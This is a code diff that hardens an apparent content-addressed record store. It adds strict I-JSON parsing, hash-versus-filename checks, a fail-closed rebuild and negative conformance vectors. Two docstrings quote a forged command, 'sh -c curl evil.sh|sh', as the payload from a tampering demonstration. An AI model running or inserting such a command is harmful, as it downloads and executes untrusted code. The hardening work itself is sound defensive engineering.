@@ -67,6 +67,117 @@ def sha256(b: bytes) -> str:
     return hashlib.sha256(b).hexdigest()
 
 
+# ---------- strict I-JSON ingestion (SPEC §1) ----------
+# §1 says every OAIP record is canonical I-JSON "exactly per Warrant SPEC §4".
+# Serialising canonically is only half of that: the other half is REFUSING input
+# outside the domain, and until 2026-07-30 nothing here refused anything —
+# `json.loads` was called bare on every artifact read. Stock Python accepts
+# duplicate member names (last-wins), NaN/Infinity, and lone surrogates; Warrant
+# rejects all three, and Go's decoder disagrees with Python on the last two. So
+# the same bytes would parse to different records in different implementations
+# while the SPEC claimed one domain. These are reimplemented rather than imported
+# from Warrant so OAIP stands alone as an implementation — and
+# `tests/ijson_parity.py` pins them against Warrant's so the copy cannot drift.
+def _reject_dup_keys(pairs):
+    d = {}
+    for k, v in pairs:
+        if k in d:
+            raise ValueError(f"duplicate member name: {k}")
+        d[k] = v
+    return d
+
+
+def _reject_constant(sym):
+    raise ValueError(f"invalid I-JSON constant: {sym}")
+
+
+def _reject_lone_surrogates(obj):
+    """RFC 7493: every string is valid Unicode. Python keeps a `\\ud800` escape as
+    a surrogate code point; Go substitutes U+FFFD — the same bytes, two different
+    strings, two different hashes."""
+    if isinstance(obj, str):
+        for ch in obj:
+            if 0xD800 <= ord(ch) <= 0xDFFF:
+                raise ValueError("lone surrogate in string (invalid I-JSON)")
+    elif isinstance(obj, dict):
+        for k, v in obj.items():
+            _reject_lone_surrogates(k)
+            _reject_lone_surrogates(v)
+    elif isinstance(obj, list):
+        for v in obj:
+            _reject_lone_surrogates(v)
+    return obj
+
+
+def _reject_floats(obj, path="$"):
+    """§1: "integers only (no floats anywhere)". Warrant enforces this per typed
+    field in `validate_body`; OAIP had no schema layer at all, so it is enforced
+    here at the domain boundary — a float `ts` or a fractional `confidence_ppm`
+    is outside the format, not a value to round."""
+    if isinstance(obj, float):
+        raise ValueError(f"float at {path}: SPEC §1 permits integers only")
+    if isinstance(obj, dict):
+        for k, v in obj.items():
+            _reject_floats(v, f"{path}.{k}")
+    elif isinstance(obj, list):
+        for i, v in enumerate(obj):
+            _reject_floats(v, f"{path}[{i}]")
+    return obj
+
+
+def loads_ijson(raw):
+    """`json.loads` restricted to the domain SPEC §1 actually declares.
+
+    The BOM case is a deliberate narrowing, not a grammar violation: RFC 8259 §8.1
+    lets a receiver ignore a leading byte order mark, and "MAY" is unaffordable in
+    a content-addressed format — the same record would arrive as two byte strings
+    with two different addresses. Measured: Python's `json.loads` strips a BOM from
+    BYTES and returns the record, Go's `encoding/json` rejects it. This mattered
+    here and not in Warrant: `read_artifact` passes raw bytes, so the BOM was
+    genuinely accepted, whereas every Warrant call site passes a `str`, where
+    `json.loads` already fails. The reject vector recorded it as
+    "ACCEPTED — must be refused" before this line existed."""
+    bom = b"\xef\xbb\xbf" if isinstance(raw, (bytes, bytearray)) else "﻿"
+    if raw[:len(bom)] == bom:
+        raise ValueError("leading byte order mark (not canonical I-JSON)")
+    return _reject_floats(_reject_lone_surrogates(
+        json.loads(raw, object_pairs_hook=_reject_dup_keys,
+                   parse_constant=_reject_constant)))
+
+
+def read_artifact(path: Path):
+    """Load an artifact, refusing bytes that do not hash to their own address.
+
+    THE DEFECT THIS CLOSES (found 2026-07-30)
+    -----------------------------------------
+    `.oaip/artifacts` IS the canonical layer: SPEC §5 ends "the projection is
+    disposable; the content-addressed causal graph is the truth." Every reader
+    used bare `json.loads(path.read_bytes())` and never recomputed the address,
+    so editing a file in place silently rewrote the truth. Demonstrated: an
+    execution record's `command` was changed to `sh -c curl evil.sh|sh`,
+    `rebuild` reported success, and the projection asserted the forged command
+    while the file still sat under its original name. Content-addressed storage
+    whose reader never checks the address is not content-addressed; it is a
+    directory of files with long names.
+
+    Returns (doc, error). `doc` is None when the artifact must not be used.
+    """
+    raw = path.read_bytes()
+    if path.name != sha256(raw):
+        return None, (f"{path.name[:12]}: bytes hash to {sha256(raw)[:12]} — "
+                      "artifact does not match its own address")
+    try:
+        doc = loads_ijson(raw)
+    except json.JSONDecodeError:
+        # A transcript or a plain blob, not a record. Must be caught BEFORE
+        # ValueError: JSONDecodeError subclasses it, so the wider clause first
+        # would report every non-JSON artifact as a canonicalization failure.
+        return None, None
+    except ValueError as e:
+        return None, f"{path.name[:12]}: not canonical I-JSON: {e}"
+    return doc, None
+
+
 def canon(obj) -> bytes:
     """RFC 8785 (JCS) I-JSON, EXACTLY per Warrant SPEC §4 (SPEC §1): sorted keys,
     compact separators, UTF-8, integers only, raw non-ASCII (ensure_ascii=False).
@@ -372,18 +483,33 @@ def cmd_rebuild(_):
     Reads ONLY .oaip/artifacts. If it needs the database to rebuild the database,
     the claim is circular and the check is worthless.
     """
+    # Read and validate the canonical layer BEFORE touching the projection. A
+    # fail-closed check that deletes the database and then refuses to rebuild it
+    # has destroyed the thing it was protecting.
+    records = []
+    bad = []
+    for path in sorted(ART.glob("*")):
+        # An artifact whose bytes do not hash to its address is not a record with
+        # a problem, it is not that record at all. Rebuilding from it would
+        # launder a forgery into the projection — which is exactly what happened
+        # before this check existed.
+        doc, err = read_artifact(path)
+        if err:
+            bad.append(err)
+            continue
+        if isinstance(doc, dict) and isinstance(doc.get("oaip_record"), str):
+            records.append(doc)
+    if bad:
+        for e in bad:
+            print("ERR ", e, file=sys.stderr)
+        sys.exit(f"refusing to rebuild: {len(bad)} corrupt artifact(s) in the "
+                 "canonical layer — the projection would assert forged facts "
+                 "(the existing projection has been left untouched)")
+
     if DB.exists():
         DB.unlink()
     con = db()
     con.executescript(SCHEMA)       # one schema definition, not a copy of it
-    records = []
-    for path in sorted(ART.glob("*")):
-        try:
-            doc = json.loads(path.read_bytes())
-        except Exception:
-            continue                # a non-record artifact (transcript, blob)
-        if isinstance(doc, dict) and isinstance(doc.get("oaip_record"), str):
-            records.append(doc)
     # Deterministic order: by timestamp then id, so a rebuild is reproducible and
     # two rebuilds of the same artifacts give the same projection.
     records.sort(key=lambda d: (d.get("ts", 0), d.get("id", "")))
@@ -432,10 +558,65 @@ def cmd_rebuild(_):
           + ", ".join(f"{k.split('@')[0]}={v}" for k, v in sorted(counts.items())))
 
 
+def verify_artifacts():
+    """Every artifact's bytes must hash to its filename, and every record must be
+    canonical I-JSON. Returns a list of errors.
+
+    Also: every hash the projection CITES must resolve. A dangling citation means
+    the projection asserts a fact whose evidence is absent — reporting the graph
+    as intact then is the same mistake as trusting a filename.
+    """
+    errs = []
+    if not ART.is_dir():
+        return [f"no canonical layer at {ART}"]
+    present = set()
+    for path in sorted(ART.glob("*")):
+        doc, err = read_artifact(path)
+        if err:
+            errs.append(err)
+        else:
+            present.add(path.name)
+
+    if DB.is_file():
+        con = db()
+        con.row_factory = sqlite3.Row
+        cited = []
+        for row in con.execute("SELECT hash FROM artifacts"):
+            cited.append(("artifacts.hash", row[0]))
+        for row in con.execute("SELECT id,subject_hash,transcript_hash FROM claims"):
+            cited.append((f"claim {row[0]}.subject", row[1]))
+            cited.append((f"claim {row[0]}.transcript", row[2]))
+        for where, h in cited:
+            if h and h not in present:
+                errs.append(f"{where} cites {h[:12]} — not resolvable in the "
+                            "canonical layer")
+    return errs
+
+
 def cmd_verify(_):
-    r = subprocess.run(WARRANT + ["--store", str(WSTORE), "verify"], capture_output=True, text=True)
-    print(r.stdout.strip().splitlines()[-1] if r.stdout.strip() else "(empty store)")
-    sys.exit(r.returncode)
+    """Verify the canonical layer FIRST, then the decision layer.
+
+    WHAT THIS USED TO DO, AND WHY IT WAS WRONG
+    ------------------------------------------
+    It shelled out to `warrant verify` on `.oaip/warrants` and printed the last
+    line — nothing else. Not one byte of `.oaip/artifacts` was examined, though
+    SPEC §5 calls that layer the truth. Demonstrated 2026-07-30: with all three
+    canonical records forged (`command` rewritten to `sh -c curl evil.sh|sh`),
+    `oaip verify` printed "0 errors" and exited 0. It was checking the store next
+    door to the evidence — a real, adjacent, healthy thing — and reporting that
+    as the health of this one.
+    """
+    errs = verify_artifacts()
+    for e in errs:
+        print("ERR ", e)
+    print(f"canonical layer: {len(errs)} error(s)" if errs
+          else "canonical layer: every artifact matches its address")
+
+    r = subprocess.run(WARRANT + ["--store", str(WSTORE), "verify"],
+                       capture_output=True, text=True)
+    print("decision layer:  " + (r.stdout.strip().splitlines()[-1]
+                                 if r.stdout.strip() else "(empty store)"))
+    sys.exit(1 if (errs or r.returncode != 0) else 0)
 
 
 def cmd_conformance(a):
@@ -450,6 +631,22 @@ def cmd_conformance(a):
         good = got.hex() == v["canon_hex"] and sha256(got) == v["canon_sha256"]
         print(("OK  " if good else "FAIL"), v["name"], "" if good else f"got {sha256(got)[:12]}")
         ok += good
+
+    # The negative half. An implementation that accepts everything passes every
+    # positive vector, so agreement on well-formed records establishes nothing
+    # about whether two implementations share a domain (SPEC §1).
+    for v in doc.get("reject", []):
+        total += 1
+        raw = bytes.fromhex(v["bytes_hex"])
+        try:
+            loads_ijson(raw)
+            rejected, why = False, "ACCEPTED — must be refused"
+        except (ValueError, UnicodeDecodeError) as e:
+            rejected, why = True, str(e)
+        print(("OK  " if rejected else "FAIL"), f"reject/{v['class']}/{v['name']}",
+              "" if rejected else why)
+        ok += rejected
+
     tag = "ALL PASS" if ok == total else "FAILURES"
     print(f"\nOAIP-CONFORMANCE: {tag} ({ok}/{total})")
     sys.exit(0 if ok == total else 1)
